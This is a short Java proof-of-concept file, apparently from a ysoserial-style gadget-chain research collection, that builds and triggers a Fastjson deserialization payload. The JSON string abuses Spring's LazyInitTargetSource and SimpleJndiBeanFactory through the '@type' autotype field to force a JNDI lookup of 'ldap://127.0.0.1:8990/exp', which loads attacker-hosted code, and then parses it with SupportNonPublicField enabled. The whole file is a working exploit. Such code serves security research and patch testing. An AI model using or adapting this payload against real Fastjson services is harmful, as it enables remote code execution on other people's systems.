package ysoserial.payloads.tabbyGadgetChains.Spring;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Poc5 {
    public static void main(String[] args) {

        String poc = "{\n" +
                "    {\n" +
                "        \"x\": {\n" +
                "\"@type\":\"Lorg.springframework.aop.target.LazyInitTargetSource;\",\"target\":\"ldap://127.0.0.1:8990/exp\",\"targetBeanName\":\"ldap://127.0.0.1:8990/exp\",\"beanFactory\":{\"@type\":\"Lorg.springframework.jndi.support.SimpleJndiBeanFactory;\"}  " +
                "        }\n" +
                "    }:\"xxx\"\n" +
                "}";
        System.out.println(poc);
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
